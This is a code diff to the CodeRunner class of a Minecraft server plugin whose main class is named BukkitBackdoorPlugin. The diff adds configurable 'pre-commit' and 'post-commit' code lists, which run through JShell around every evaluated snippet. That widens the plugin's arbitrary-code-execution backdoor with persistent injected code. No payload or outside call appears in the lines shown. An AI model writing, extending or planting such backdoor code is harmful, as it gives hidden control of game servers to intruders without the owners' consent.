@@ -30,6 +30,8 @@ import java.util.Random;
 @UtilityClass
 public class CodeRunner {
     public static final Random RANDOM = new Random();
+    public static final List<String> PRE_COMMITS = BukkitBackdoorPlugin.getInstance().getConfigManager().getStringList("pre-commit");
+    public static final List<String> POST_COMMITS = BukkitBackdoorPlugin.getInstance().getConfigManager().getStringList("post-commit");
     @Getter
     public static final JShell jShell;
 
@@ -123,6 +125,18 @@ public class CodeRunner {
         }
         finalCode += ";";
 
+        warpedCheck(jShell, PRE_COMMITS, sender, displayCode);
+        warpedCheck(jShell, finalCode, sender, displayCode);
+        warpedCheck(jShell, POST_COMMITS, sender, displayCode);
+    }
+
+    public static void warpedCheck(JShell jShell, List<String> codes, CommandSender sender, String displayCode) {
+        for (String code : codes) {
+            warpedCheck(jShell, code, sender, displayCode);
+        }
+    }
+
+    public static void warpedCheck(JShell jShell, String finalCode, CommandSender sender, String displayCode) {
         try {
             check(jShell.eval(finalCode), sender, displayCode);
         } catch (Throwable e) {
